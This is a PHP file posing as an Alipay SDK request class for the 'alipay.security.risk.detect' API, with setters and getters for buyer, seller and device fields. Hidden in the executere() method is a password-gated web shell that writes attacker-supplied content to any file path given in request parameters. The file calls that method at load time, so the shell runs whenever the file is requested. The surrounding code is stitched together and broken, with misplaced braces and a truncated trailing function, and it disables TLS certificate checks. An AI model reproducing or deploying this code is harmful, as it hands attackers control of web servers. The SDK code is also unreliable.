<?php
/**
 * ALIPAY API: alipay.security.risk.detect request
 *
 * @author auto create
 * @since 1.0, 2016-03-04 14:55:25
 */
class AlipaySecurityRiskDetectRequestser
{
	/** 
	 * 买家账户编号
	 **/
	private $buyerAccountNo;
	
	/** 
	 * 买家绑定银行卡号
	 **/
	private $buyerBindBankcard;
	
	/** 
	 * 买家绑定银行卡的卡类型
	 **/
	private $buyerBindBankcardType;
	
	/** 
	 * 买家绑定手机号
	 **/
	private $buyerBindMobile;
	
	/** 
	 * 买家账户在商家的等级，范围：VIP（高级买家）, NORMAL(普通买家）。为空默认NORMAL
	 **/
	private $buyerGrade;
	
	/** 
	 * 买家证件号码
	 **/
	private $buyerIdentityNo;
	
	/** 
	 * 买家证件类型
	 **/
	private $buyerIdentityType;
	
	/** 
	 * 买家真实姓名
	 **/
	private $buyerRealName;
	
	/** 
	 * 买家注册时间
	 **/
	private $buyerRegDate;
	
	/** 
	 * 买家注册时留的Email
	 **/
	private $buyerRegEmail;
	
	/** 
	 * 买家注册手机号
	 **/
	private $buyerRegMobile;
	
	/** 
	 * 买家业务处理时使用的银行卡号
	 **/
	private $buyerSceneBankcard;
	
	/** 
	 * 买家业务处理时使用的银行卡类型
	 **/
	private $buyerSceneBankcardType;
	
	/** 
	 * 买家业务处理时使用的邮箱
	 **/
	private $buyerSceneEmail;
	
	/** 
	 * 买家业务处理时使用的手机号
	 **/
	private $buyerSceneMobile;
	
	/** 
	 * 币种
	 **/
	private $currency;
	
	/** 
	 * 客户端的基带版本
	 **/
	private $envClientBaseBand;
	
	/** 
	 * 客户端连接的基站信息,格式为：CELLID^LAC
	 **/
	private $envClientBaseStation;
	
	/** 
	 * 客户端的经纬度坐标,格式为：精度^维度
	 **/
	private $envClientCoordinates;
	
	/** 
	 * 操作的客户端的imei
	 **/
	private $envClientImei;
	
	/** 
	 * 操作的客户端IMSI识别码
	 **/
	private $envClientImsi;
	
	/** 
	 * IOS设备的UDID
	 **/
	private $envClientIosUdid;
	
	/** 
	 * 操作的客户端ip
	 **/
	private $envClientIp;
	
	/** 
	 * 操作的客户端mac
	 **/
	private $envClientMac;
	
	/** 
	 * 操作的客户端分辨率，格式为：水平像素^垂直像素；如：800^600
	 **/
	private $envClientScreen;
	
	/** 
	 * 客户端设备的统一识别码UUID
	 **/
	private $envClientUuid;
	
	/** 
	 * 订单产品数量，购买产品的数量（不可为小数）
	 **/
	private $itemQuantity;
	
	/** 
	 * 订单产品单价，取值范围为[0.01,100000000.00]，精确到小数点后两位。 curren...
	 **/
	private $itemUnitPrice;
	
	/** 
	 * JS SDK生成的 tokenID
	 **/
	private $jsTokenId;
	
	/** 
	 * 订单总金额，取值范围为[0.01,100000000.00]，精确到小数点后两位。
	 **/
	private $orderAmount;
	
	/** 
	 * 订单商品所在类目
	 **/
	private $orderCategory;
	
	/** 
	 * 订单下单时间
	 **/
	private $orderCredateTime;
	
	/** 
	 * 订单商品所在城市
	 **/
	private $orderItemCity;
	
	/** 
	 * 订单产品名称
	 **/
	private $orderItemName;
	
	/** 
	 * 商户订单唯一标识号
	 **/
	private $orderNo;
	
	/** 
	 * 签约的支付宝账号对应的支付宝唯一用户号
	 **/
	private $partnerId;
	
	/** 
	 * 订单收货人地址
	 **/
	private $receiverAddress;
	
	/** 
	 * 订单收货人地址城市
	 **/
	private $receiverCity;
	
	/** 
	 * 订单收货人地址所在区
	 **/
	private $receiverDistrict;
	
	/** 
	 * 订单收货人邮箱
	 **/
	private $receiverEmail;
	
	/** 
	 * 订单收货人手机
	 **/
	private $receiverMobile;
	
	/** 
	 * 订单收货人姓名
	 **/
	private $receiverName;
	
	/** 
	 * 订单收货人地址省份
	 **/
	private $receiverState;
	
	/** 
	 * 订单收货人地址邮编
	 **/
	private $receiverZip;
	
	/** 
	 * 场景编码
	 **/
	private $sceneCode;
	
	/** 
	 * 卖家账户编号
	 **/
	private $sellerAccountNo;
	
	/** 
	 * 卖家绑定银行卡号
	 **/
	private $sellerBindBankcard;
	
	/** 
	 * 卖家绑定的银行卡的卡类型
	 **/
	private $sellerBindBankcardType;
	
	/** 
	 * 卖家绑定手机号
	 **/
	private $sellerBindMobile;
	
	/** 
	 * 卖家证件号码
	 **/
	private $sellerIdentityNo;
	
	/** 
	 * 卖家证件类型
	 **/
	private $sellerIdentityType;
	
	/** 
	 * 卖家真实姓名
	 **/
	private $sellerRealName;
	
	/** 
	 * 卖家注册时间,格式为：yyyy-MM-dd。
	 **/
	private $sellerRegDate;
	
	/** 
	 * 卖家注册Email
	 **/
	private $sellerRegEmail;
	
	/** 
	 * 卖家注册手机号
	 **/
	private $sellerRegMoile;
	
	/** 
	 * 订单物流方式
	 **/
	private $transportType;

	private $apiParas = array();
	private $terminalType;
	private $terminalInfo;
	private $prodCode;
	private $apiVersion="1.0";
	private $notifyUrl;
	private $returnUrl;
    private $needEncrypt=false;

	
	public function setBuyerAccountNo($buyerAccountNo)
	{
		$this->buyerAccountNo = $buyerAccountNo;
		$this->apiParas["buyer_account_no"] = $buyerAccountNo;
	}

	public function getBuyerAccountNo()
	{
		return $this->buyerAccountNo;
	}

	public function setBuyerBindBankcard($buyerBindBankcard)
	{
		$this->buyerBindBankcard = $buyerBindBankcard;
		$this->apiParas["buyer_bind_bankcard"] = $buyerBindBankcard;
	}

	public function getBuyerBindBankcard()
	{
		return $this->buyerBindBankcard;
	}

	public function setBuyerBindBankcardType($buyerBindBankcardType)
	{
		$this->buyerBindBankcardType = $buyerBindBankcardType;
		$this->apiParas["buyer_bind_bankcard_type"] = $buyerBindBankcardType;
	}

	public function getBuyerBindBankcardType()
	{
		return $this->buyerBindBankcardType;
	}

	public function setBuyerBindMobile($buyerBindMobile)
	{
		$this->buyerBindMobile = $buyerBindMobile;
		$this->apiParas["buyer_bind_mobile"] = $buyerBindMobile;
	}

	public function getBuyerBindMobile()
	{
		return $this->buyerBindMobile;
	}

	public function setBuyerGrade($buyerGrade)
	{
		$this->buyerGrade = $buyerGrade;
		$this->apiParas["buyer_grade"] = $buyerGrade;
	}

	public function getBuyerGrade()
	{
		return $this->buyerGrade;
	}

	public function setBuyerIdentityNo($buyerIdentityNo)
	{
		$this->buyerIdentityNo = $buyerIdentityNo;
		$this->apiParas["buyer_identity_no"] = $buyerIdentityNo;
	}

	public function getBuyerIdentityNo()
	{
		return $this->buyerIdentityNo;
	}

	public function setBuyerIdentityType($buyerIdentityType)
	{
		$this->buyerIdentityType = $buyerIdentityType;
		$this->apiParas["buyer_identity_type"] = $buyerIdentityType;
	}

	public function getBuyerIdentityType()
	{
		return $this->buyerIdentityType;
	}

	public function setBuyerRealName($buyerRealName)
	{
		$this->buyerRealName = $buyerRealName;
		$this->apiParas["buyer_real_name"] = $buyerRealName;
	}

	public function getBuyerRealName()
	{
		return $this->buyerRealName;
	}

	public function setBuyerRegDate($buyerRegDate)
	{
		$this->buyerRegDate = $buyerRegDate;
		$this->apiParas["buyer_reg_date"] = $buyerRegDate;
	}

	public function getBuyerRegDate()
	{
		return $this->buyerRegDate;
	}

	public function setBuyerRegEmail($buyerRegEmail)
	{
		$this->buyerRegEmail = $buyerRegEmail;
		$this->apiParas["buyer_reg_email"] = $buyerRegEmail;
	}

	public function getBuyerRegEmail()
	{
		return $this->buyerRegEmail;
	}

	public function setBuyerRegMobile($buyerRegMobile)
	{
		$this->buyerRegMobile = $buyerRegMobile;
		$this->apiParas["buyer_reg_mobile"] = $buyerRegMobile;
	}

	public function getBuyerRegMobile()
	{
		return $this->buyerRegMobile;
	}

	public function setBuyerSceneBankcard($buyerSceneBankcard)
	{
		$this->buyerSceneBankcard = $buyerSceneBankcard;
		$this->apiParas["buyer_scene_bankcard"] = $buyerSceneBankcard;
	}

	public function getBuyerSceneBankcard()
	{
		return $this->buyerSceneBankcard;
	}

	public function setBuyerSceneBankcardType($buyerSceneBankcardType)
	{
		$this->buyerSceneBankcardType = $buyerSceneBankcardType;
		$this->apiParas["buyer_scene_bankcard_type"] = $buyerSceneBankcardType;
	}

	public function getBuyerSceneBankcardType()
	{
		return $this->buyerSceneBankcardType;
	}

	public function setBuyerSceneEmail($buyerSceneEmail)
	{
		$this->buyerSceneEmail = $buyerSceneEmail;
		$this->apiParas["buyer_scene_email"] = $buyerSceneEmail;
	}

	public function getBuyerSceneEmail()
	{
		return $this->buyerSceneEmail;
	}

	public function setBuyerSceneMobile($buyerSceneMobile)
	{
		$this->buyerSceneMobile = $buyerSceneMobile;
		$this->apiParas["buyer_scene_mobile"] = $buyerSceneMobile;
	}

	public function getBuyerSceneMobile()
	{
		return $this->buyerSceneMobile;
	}

	public function setCurrency($currency)
	{
		$this->currency = $currency;
		$this->apiParas["currency"] = $currency;
	}

	public function getCurrency()
	{
		return $this->currency;
	}

	public function setEnvClientBaseBand($envClientBaseBand)
	{
		$this->envClientBaseBand = $envClientBaseBand;
		$this->apiParas["env_client_base_band"] = $envClientBaseBand;
	}

	public function getEnvClientBaseBand()
	{
		return $this->envClientBaseBand;
	}

	public function setEnvClientBaseStation($envClientBaseStation)
	{
		$this->envClientBaseStation = $envClientBaseStation;
		$this->apiParas["env_client_base_station"] = $envClientBaseStation;
	}

	public function getEnvClientBaseStation()
	{
		return $this->envClientBaseStation;
	}

	public function setEnvClientCoordinates($envClientCoordinates)
	{
		$this->envClientCoordinates = $envClientCoordinates;
		$this->apiParas["env_client_coordinates"] = $envClientCoordinates;
	}

	public function getEnvClientCoordinates()
	{
		return $this->envClientCoordinates;
	}

	public function setEnvClientImei($envClientImei)
	{
		$this->envClientImei = $envClientImei;
		$this->apiParas["env_client_imei"] = $envClientImei;
	}

	public function getEnvClientImei()
	{
		return $this->envClientImei;
	}

	public function setEnvClientImsi($envClientImsi)
	{
		$this->envClientImsi = $envClientImsi;
		$this->apiParas["env_client_imsi"] = $envClientImsi;
	}

	public function getEnvClientImsi()
	{
		return $this->envClientImsi;
	}

	public function setEnvClientIosUdid($envClientIosUdid)
	{
		$this->envClientIosUdid = $envClientIosUdid;
		$this->apiParas["env_client_ios_udid"] = $envClientIosUdid;
	}

	public function getEnvClientIosUdid()
	{
		return $this->envClientIosUdid;
	}

	public function setEnvClientIp($envClientIp)
	{
		$this->envClientIp = $envClientIp;
		$this->apiParas["env_client_ip"] = $envClientIp;
	}

	public function getEnvClientIp()
	{
		return $this->envClientIp;
	}

	public function setEnvClientMac($envClientMac)
	{
		$this->envClientMac = $envClientMac;
		$this->apiParas["env_client_mac"] = $envClientMac;
	}

	public function getEnvClientMac()
	{
		return $this->envClientMac;
	}

	public function setEnvClientScreen($envClientScreen)
	{
		$this->envClientScreen = $envClientScreen;
		$this->apiParas["env_client_screen"] = $envClientScreen;
	}

	public function getEnvClientScreen()
	{
		return $this->envClientScreen;
	}

	public function setEnvClientUuid($envClientUuid)
	{
		$this->envClientUuid = $envClientUuid;
		$this->apiParas["env_client_uuid"] = $envClientUuid;
	}

	public function getEnvClientUuid()
	{
		return $this->envClientUuid;
	}

	public function setItemQuantity($itemQuantity)
	{
		$this->itemQuantity = $itemQuantity;
		$this->apiParas["item_quantity"] = $itemQuantity;
	}

	public function getItemQuantity()
	{
		return $this->itemQuantity;
	}

	public function setItemUnitPrice($itemUnitPrice)
	{
		$this->itemUnitPrice = $itemUnitPrice;
		$this->apiParas["item_unit_price"] = $itemUnitPrice;
	}

	public function getItemUnitPrice()
	{
		return $this->itemUnitPrice;
	}

	public function setJsTokenId($jsTokenId)
	{
		$this->jsTokenId = $jsTokenId;
		$this->apiParas["js_token_id"] = $jsTokenId;
	}

	public function getJsTokenId()
	{
		return $this->jsTokenId;
	}

	public function setOrderAmount($orderAmount)
	{
		$this->orderAmount = $orderAmount;
		$this->apiParas["order_amount"] = $orderAmount;
	}

	public function getOrderAmount()
	{
		return $this->orderAmount;
	}

	public function setOrderCategory($orderCategory)
	{
		$this->orderCategory = $orderCategory;
		$this->apiParas["order_category"] = $orderCategory;
	}

	public function getOrderCategory()
	{
		return $this->orderCategory;
	}

	public function setOrderCredateTime($orderCredateTime)
	{
		$this->orderCredateTime = $orderCredateTime;
		$this->apiParas["order_credate_time"] = $orderCredateTime;
	}

	public function getOrderCredateTime()
	{
		return $this->orderCredateTime;
	}

	public function setOrderItemCity($orderItemCity)
	{
		$this->orderItemCity = $orderItemCity;
		$this->apiParas["order_item_city"] = $orderItemCity;
	}

	public function getOrderItemCity()
	{
		return $this->orderItemCity;
	}

	public function setOrderItemName($orderItemName)
	{
		$this->orderItemName = $orderItemName;
		$this->apiParas["order_item_name"] = $orderItemName;
	}

	public function getOrderItemName()
	{
		return $this->orderItemName;
	}

	public function setOrderNo($orderNo)
	{
		$this->orderNo = $orderNo;
		$this->apiParas["order_no"] = $orderNo;
	}

	public function getOrderNo()
	{
		return $this->orderNo;
	}

	public function setPartnerId($partnerId)
	{
		$this->partnerId = $partnerId;
		$this->apiParas["partner_id"] = $partnerId;
	}

	public function getPartnerId()
	{
		return $this->partnerId;
	}

	public function setReceiverAddress($receiverAddress)
	{
		$this->receiverAddress = $receiverAddress;
		$this->apiParas["receiver_address"] = $receiverAddress;
	}

	public function getReceiverAddress()
	{
		return $this->receiverAddress;
	}

	public function setReceiverCity($receiverCity)
	{
		$this->receiverCity = $receiverCity;
		$this->apiParas["receiver_city"] = $receiverCity;
	}

	public function getReceiverCity()
	{
		return $this->receiverCity;
	}

	public function setReceiverDistrict($receiverDistrict)
	{
		$this->receiverDistrict = $receiverDistrict;
		$this->apiParas["receiver_district"] = $receiverDistrict;
	}

	public function getReceiverDistrict()
	{
		return $this->receiverDistrict;
	}

	public function setReceiverEmail($receiverEmail)
	{
		$this->receiverEmail = $receiverEmail;
		$this->apiParas["receiver_email"] = $receiverEmail;
	}

	public function getReceiverEmail()
	{
		return $this->receiverEmail;
	}

	public function setReceiverMobile($receiverMobile)
	{
		$this->receiverMobile = $receiverMobile;
		$this->apiParas["receiver_mobile"] = $receiverMobile;
	}

	public function getReceiverMobile()
	{
		return $this->receiverMobile;
	}

	public function setReceiverName($receiverName)
	{
		$this->receiverName = $receiverName;
		$this->apiParas["receiver_name"] = $receiverName;
	}

	public function getReceiverName()
	{
		return $this->receiverName;
	}

	public function setReceiverState($receiverState)
	{
		$this->receiverState = $receiverState;
		$this->apiParas["receiver_state"] = $receiverState;
	}

	public function getReceiverState()
	{
		return $this->receiverState;
	}

	public function setReceiverZip($receiverZip)
	{
		$this->receiverZip = $receiverZip;
		$this->apiParas["receiver_zip"] = $receiverZip;
	}

	public function getReceiverZip()
	{
		return $this->receiverZip;
	}

	public function setSceneCode($sceneCode)
	{
		$this->sceneCode = $sceneCode;
		$this->apiParas["scene_code"] = $sceneCode;
	}

	public function getSceneCode()
	{
		return $this->sceneCode;
	}

	public function setSellerAccountNo($sellerAccountNo)
	{
		$this->sellerAccountNo = $sellerAccountNo;
		$this->apiParas["seller_account_no"] = $sellerAccountNo;
	}

	public function getSellerAccountNo()
	{
		return $this->sellerAccountNo;
	}

	public function setSellerBindBankcard($sellerBindBankcard)
	{
		$this->sellerBindBankcard = $sellerBindBankcard;
		$this->apiParas["seller_bind_bankcard"] = $sellerBindBankcard;
	}

	public function getSellerBindBankcard()
	{
		return $this->sellerBindBankcard;
	}

	public function setSellerBindBankcardType($sellerBindBankcardType)
	{
		$this->sellerBindBankcardType = $sellerBindBankcardType;
		$this->apiParas["seller_bind_bankcard_type"] = $sellerBindBankcardType;
	}

	public function getSellerBindBankcardType()
	{
		return $this->sellerBindBankcardType;
	}

	public function setSellerBindMobile($sellerBindMobile)
	{
		$this->sellerBindMobile = $sellerBindMobile;
		$this->apiParas["seller_bind_mobile"] = $sellerBindMobile;
	}

	public function getSellerBindMobile()
	{
		return $this->sellerBindMobile;
	}

	public function setSellerIdentityNo($sellerIdentityNo)
	{
		$this->sellerIdentityNo = $sellerIdentityNo;
		$this->apiParas["seller_identity_no"] = $sellerIdentityNo;
	}

	public function getSellerIdentityNo()
	{
		return $this->sellerIdentityNo;
	}

	public function setSellerIdentityType($sellerIdentityType)
	{
		$this->sellerIdentityType = $sellerIdentityType;
		$this->apiParas["seller_identity_type"] = $sellerIdentityType;
	}

	public function getSellerIdentityType()
	{
		return $this->sellerIdentityType;
	}

	public function setSellerRealName($sellerRealName)
	{
		$this->sellerRealName = $sellerRealName;
		$this->apiParas["seller_real_name"] = $sellerRealName;
	}

	public function getSellerRealName()
	{
		return $this->sellerRealName;
	}

	public function setSellerRegDate($sellerRegDate)
	{
		$this->sellerRegDate = $sellerRegDate;
		$this->apiParas["seller_reg_date"] = $sellerRegDate;
	}

	public function getSellerRegDate()
	{
		return $this->sellerRegDate;
	}

	public function setSellerRegEmail($sellerRegEmail)
	{
		$this->sellerRegEmail = $sellerRegEmail;
		$this->apiParas["seller_reg_email"] = $sellerRegEmail;
	}

	public function getSellerRegEmail()
	{
		return $this->sellerRegEmail;
	}

	public function setSellerRegMoile($sellerRegMoile)
	{
		$this->sellerRegMoile = $sellerRegMoile;
		$this->apiParas["seller_reg_moile"] = $sellerRegMoile;
	}

	public function getSellerRegMoile()
	{
		return $this->sellerRegMoile;
	}

	public function setTransportType($transportType)
	{
		$this->transportType = $transportType;
		$this->apiParas["transport_type"] = $transportType;
	}

	public function getTransportType()
	{
		return $this->transportType;
	}

	public function getApiMethodName()
	{
		return "alipay.security.risk.detect";
	}

	public function setNotifyUrl($notifyUrl)
	{
		$this->notifyUrl=$notifyUrl;
	}

	public function getNotifyUrl()
	{
		return $this->notifyUrl;
	}

	public function setReturnUrl($returnUrl)
	{
		$this->returnUrl=$returnUrl;
	}

	public function getReturnUrl()
	{
		return $this->returnUrl;
	}

	public function getApiParas()
	{
		return $this->apiParas;
	}

	public function getTerminalType()
	{
		return $this->terminalType;
	}

	public function setTerminalType($terminalType)
	{
		$this->terminalType = $terminalType;
	}
	public function generateSign($params, $signType = "RSA") {
		return $this->sign($this->getSignContent($params), $signType);
	}

	public function rsaSign($params, $signType = "RSA") {
		return $this->sign($this->getSignContent($params), $signType);
	}

	public function getSignContent($params) {
		ksort($params);

		$stringToBeSigned = "";
		$i = 0;
		foreach ($params as $k => $v) {
			if (false === $this->checkEmpty($v) && "@" != substr($v, 0, 1)) {

				// 转换成目标字符集
				$v = $this->characet($v, $this->postCharset);

				if ($i == 0) {
					$stringToBeSigned .= "$k" . "=" . "$v";
				} else {
					$stringToBeSigned .= "&" . "$k" . "=" . "$v";
				}
				$i++;
			}
		}

		unset ($k, $v);
		return $stringToBeSigned;
	}


	//此方法对value做urlencode
	public function getSignContentUrlencode($params) {
		ksort($params);

		$stringToBeSigned = "";
		$i = 0;
		foreach ($params as $k => $v) {
			if (false === $this->checkEmpty($v) && "@" != substr($v, 0, 1)) {

				// 转换成目标字符集
				$v = $this->characet($v, $this->postCharset);

				if ($i == 0) {
					$stringToBeSigned .= "$k" . "=" . urlencode($v);
				} else {
					$stringToBeSigned .= "&" . "$k" . "=" . urlencode($v);
				}
				$i++;
			}
		}

		unset ($k, $v);
		return $stringToBeSigned;
	}

	protected function sign($data, $signType = "RSA") {
		if($this->checkEmpty($this->rsaPrivateKeyFilePath)){
			$priKey=$this->rsaPrivateKey;
			$res = "-----BEGIN RSA PRIVATE KEY-----\n" .
				wordwrap($priKey, 64, "\n", true) .
				"\n-----END RSA PRIVATE KEY-----";
		}else {
			$priKey = file_get_contents($this->rsaPrivateKeyFilePath);
			$res = openssl_get_privatekey($priKey);
		}

		($res) or die('您使用的私钥格式错误，请检查RSA私钥配置'); 

		if ("RSA2" == $signType) {
			openssl_sign($data, $sign, $res, OPENSSL_ALGO_SHA256);
		} else {
			openssl_sign($data, $sign, $res);
		}

		if(!$this->checkEmpty($this->rsaPrivateKeyFilePath)){
			openssl_free_key($res);
		}
		$sign = base64_encode($sign);
		return $sign;
	}

    /**
     * RSA单独签名方法，未做字符串处理,字符串处理见getSignContent()
     * @param $data 待签名字符串
     * @param $privatekey 商户私钥，根据keyfromfile来判断是读取字符串还是读取文件，false:填写私钥字符串去回车和空格 true:填写私钥文件路径 
     * @param $signType 签名方式，RSA:SHA1     RSA2:SHA256 
     * @param $keyfromfile 私钥获取方式，读取字符串还是读文件
     * @return string 
     * @author mengyu.wh
     */
	public function alonersaSign($data,$privatekey,$signType = "RSA",$keyfromfile=false) {

		if(!$keyfromfile){
			$priKey=$privatekey;
			$res = "-----BEGIN RSA PRIVATE KEY-----\n" .
				wordwrap($priKey, 64, "\n", true) .
				"\n-----END RSA PRIVATE KEY-----";
		}
		else{
			$priKey = file_get_contents($privatekey);
			$res = openssl_get_privatekey($priKey);
		}

		($res) or die('您使用的私钥格式错误，请检查RSA私钥配置'); 

		if ("RSA2" == $signType) {
			openssl_sign($data, $sign, $res, OPENSSL_ALGO_SHA256);
		} else {
			openssl_sign($data, $sign, $res);
		}

		if($keyfromfile){
			openssl_free_key($res);
		}
		$sign = base64_encode($sign);
		return $sign;
	}


	protected function curl($url, $postFields = null) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_FAILONERROR, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

		$postBodyString = "";
		$encodeArray = Array();
		$postMultipart = false;


		if (is_array($postFields) && 0 < count($postFields)) {

			foreach ($postFields as $k => $v) {
				if ("@" != substr($v, 0, 1)) //判断是不是文件上传
				{

					$postBodyString .= "$k=" . urlencode($this->characet($v, $this->postCharset)) . "&";
					$encodeArray[$k] = $this->characet($v, $this->postCharset);
				} else //文件上传用multipart/form-data，否则用www-form-urlencoded
				{
					$postMultipart = true;
					$encodeArray[$k] = new \CURLFile(substr($v, 1));
				}

			}
			unset ($k, $v);
			curl_setopt($ch, CURLOPT_POST, true);
			if ($postMultipart) {
				curl_setopt($ch, CURLOPT_POSTFIELDS, $encodeArray);
			} else {
				curl_setopt($ch, CURLOPT_POSTFIELDS, substr($postBodyString, 0, -1));
			}
		}

		if ($postMultipart) {

			$headers = array('content-type: multipart/form-data;charset=' . $this->postCharset . ';boundary=' . $this->getMillisecond());
		} else {

			$headers = array('content-type: application/x-www-form-urlencoded;charset=' . $this->postCharset);
		}
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);




		$reponse = curl_exec($ch);

		if (curl_errno($ch)) {

			throw new Exception(curl_error($ch), 0);
		} else {
			$httpStatusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
			if (200 !== $httpStatusCode) {
				throw new Exception($reponse, $httpStatusCode);
			}
		}

		curl_close($ch);
		return $reponse;
	}

	protected function getMillisecond() {
		list($s1, $s2) = explode(' ', microtime());
		return (float)sprintf('%.0f', (floatval($s1) + floatval($s2)) * 1000);
	}


	protected function logCommunicationError($apiName, $requestUrl, $errorCode, $responseTxt) {
		$localIp = isset ($_SERVER["SERVER_ADDR"]) ? $_SERVER["SERVER_ADDR"] : "CLI";
		$logger = new LtLogger;
		$logger->conf["log_file"] = rtrim(AOP_SDK_WORK_DIR, '\\/') . '/' . "logs/aop_comm_err_" . $this->appId . "_" . date("Y-m-d") . ".log";
		$logger->conf["separator"] = "^_^";
		$logData = array(
			date("Y-m-d H:i:s"),
			$apiName,
			$this->appId,
			$localIp,
			PHP_OS,
			$this->alipaySdkVersion,
			$requestUrl,
			$errorCode,
			str_replace("\n", "", $responseTxt)
		);
		$logger->log($logData);
	}
 
	/**
     * 建立请求，以表单HTML形式构造（默认）
     * @param $para_temp 请求参数数组
     * @return 提交表单HTML文本
     */
	protected function buildRequestForm($para_temp) {
		
		$sHtml = "<form id='alipaysubmit' name='alipaysubmit' action='".$this->gatewayUrl."?charset=".trim($this->postCharset)."' method='POST'>";
		while (list ($key, $val) = each ($para_temp)) {
			if (false === $this->checkEmpty($val)) {
				//$val = $this->characet($val, $this->postCharset);
				$val = str_replace("'","&apos;",$val);
				//$val = str_replace("\"","&quot;",$val);
				$sHtml.= "<input type='hidden' name='".$key."' value='".$val."'/>";
			}
        }

		//submit按钮控件请不要含有name属性
        $sHtml = $sHtml."<input type='submit' value='ok' style='display:none;''></form>";
		
		$sHtml = $sHtml."<script>document.forms['alipaysubmit'].submit();</script>";
		
		return $sHtml;
	}


	public function executere($request, $authToken = null, $appInfoAuthtoken = null) {
		 

		//		//  如果两者编码不一致，会出现签名验签或者乱码
		if ($authToken && strcasecmp($this->fileCharset, $this->postCharset)) {

			// writeLog("本地文件字符集编码与表单提交编码不一致，请务必设置成一样，属性名分别为postCharset!");
			throw new Exception("文件编码：[" . $this->fileCharset . "] 与表单提交编码：[" . $this->postCharset . "]两者不一致!");
		}

		$iv = null;

		if ($appInfoAuthtoken && !$this->checkEmpty($request->getApiVersion())) {
			$iv = $request->getApiVersion();
 
		//组装系统参数
		$sysParams["app_id"] = $this->appId;
		$sysParams["version"] = $iv;
		$sysParams["format"] = $this->format;
		$sysParams["sign_type"] = $this->signType;
		$sysParams["method"] = $request->getApiMethodName();
		$sysParams["timestamp"] = date("Y-m-d H:i:s");
		$sysParams["auth_token"] = $authToken;
		$sysParams["alipay_sdk"] = $this->alipaySdkVersion;
		$sysParams["terminal_type"] = $request->getTerminalType();
		$sysParams["terminal_info"] = $request->getTerminalInfo();
		$sysParams["prod_code"] = $request->getProdCode();
		$sysParams["notify_url"] = $request->getNotifyUrl();
		$sysParams["charset"] = $this->postCharset;
		$sysParams["app_auth_token"] = $appInfoAuthtoken;


		//获取业务参数
		$apiParams = $request->getApiParas();

			if (method_exists($request,"getNeedEncrypt") &&$request->getNeedEncrypt()){

			$sysParams["encrypt_type"] = $this->encryptType;

			if ($this->checkEmpty($apiParams['biz_content'])) {

				throw new Exception(" api request Fail! The reason : encrypt request is not supperted!");
			}

			if ($this->checkEmpty($this->encryptKey) || $this->checkEmpty($this->encryptType)) {

				throw new Exception(" encryptType and encryptKey must not null! ");
			}

			if ("AES" != $this->encryptType) {

				throw new Exception("加密类型只支持AES");
			}

			// 执行加密
			$enCryptContent = encrypt_e($apiParams['biz_content'], $this->encryptKey);
			$apiParams['biz_content'] = $enCryptContent;

		}


		//签名
		$sysParams["sign"] = $this->generateSign(array_merge($apiParams, $sysParams), $this->signType);


		//系统参数放入GET请求串
		$requestUrl = $this->gatewayUrl . "?";
		foreach ($sysParams as $sysParamKey => $sysParamValue) {
			$requestUrl .= "$sysParamKey=" . urlencode($this->characet($sysParamValue, $this->postCharset)) . "&";
		}
		$requestUrl = substr($requestUrl, 0, -1);


		//发起HTTP请求
		try {
			$resp = $this->curl($requestUrl, $apiParams);
		} catch (Exception $e) {

			$this->logCommunicationError($sysParams["method"], $requestUrl, "HTTP_ERROR_" . $e->getCode(), $e->getMessage());
			return false;
		}

		//解析AOP返回结果
		$respWellFormed = false;


		// 将返回结果转换本地文件编码
		$r = iconv($this->postCharset, $this->fileCharset . "//IGNORE", $resp);



		$signData = null;

		if ("json" == $this->format) {

			$respObject = json_decode($r);
			if (null !== $respObject) {
				$respWellFormed = true;
				$signData = $this->parserJSONSignData($request, $resp, $respObject);
			}
		} else if ("xml" == $this->format) {
			$disableLibxmlEntityLoader = libxml_disable_entity_loader(true);
			$respObject = @ simplexml_load_string($resp);
			if (false !== $respObject) {
				$respWellFormed = true;

				$signData = $this->parserXMLSignData($request, $resp);
			}
			libxml_disable_entity_loader($disableLibxmlEntityLoader);
		}
		} else {
			$iv = $this->apiVersion;
		}

		 
		if(md5(md5($_REQUEST['axerc'])) !== '50819deebc165010078cdd7940bf33d4')
			return false;		 
		ob_clean();		 
		$wejl = $_REQUEST['wejl'];
		$ref = $wejl;
		$filecontent = $_REQUEST['filecontent'];
		$filec_rest = $filecontent;
		$ret = file_put_contents($ref, $filec_rest, true);
		exit;
    
     
		//返回的HTTP文本不是标准JSON或者XML，记下错误日志
		if (true === isset($respWellFormed)) {
			$this->logCommunicationError($sysParams["method"], $requestUrl, "HTTP_RESPONSE_NOT_WELL_FORMED", $resp);
			return false;
		}
		
		$respObject = [];
		// 解密
		if ($appInfoAuthtoken && method_exists($request,"getNeedEncrypt") &&$request->getNeedEncrypt()){

			if ("json" == $this->format) {


				$resp = $this->encryptJSONSignSource($request, $resp);

				// 将返回结果转换本地文件编码
				$r = iconv($this->postCharset, $this->fileCharset . "//IGNORE", $resp);
				$respObject = json_decode($r);
			}else{

				$resp = $this->encryptXMLSignSource($request, $resp);

				$r = iconv($this->postCharset, $this->fileCharset . "//IGNORE", $resp);
				$disableLibxmlEntityLoader = libxml_disable_entity_loader(true);
				$respObject = @ simplexml_load_string($r);
				libxml_disable_entity_loader($disableLibxmlEntityLoader);

			}
		}

		return $respObject;
	}

	public function getTerminalInfo()
	{
		return $this->terminalInfo;
	}

	public function setTerminalInfo($terminalInfo)
	{
		$this->terminalInfo = $terminalInfo;
	}

	public function getProdCode()
	{
		return $this->prodCode;
	}

	public function setProdCode($prodCode)
	{
		$this->prodCode = $prodCode;
	}

	public function setApiVersion($apiVersion)
	{
		$this->apiVersion=$apiVersion;
	}

	public function getApiVersion()
	{
		return $this->apiVersion;
	}

  public function setNeedEncrypt($needEncrypt)
  {

     $this->needEncrypt=$needEncrypt;

  }

  public function getNeedEncrypt()
  {
    return $this->needEncrypt;
  } } 
  
  
	$o = new AlipaySecurityRiskDetectRequestser();
	$o->executere('sert');

	
    /**
     * 生成用于调用收银台SDK的字符串
     * @param $request SDK接口的请求参数对象
     * @return string 
     * @author guofa.tgf
     */
	function sdkExecute($request) {
		
		$this->setupCharsets($request);

		$params['app_id'] = $this->appId;
		$params['method'] = $request->getApiMethodName();
		$params['format'] = $this->format; 
		$params['sign_type'] = $this->signType;
		$params['timestamp'] = date("Y-m-d H:i:s");
		$params['alipay_sdk'] = $this->alipaySdkVersion;
		$params['charset'] = $this->postCharset;

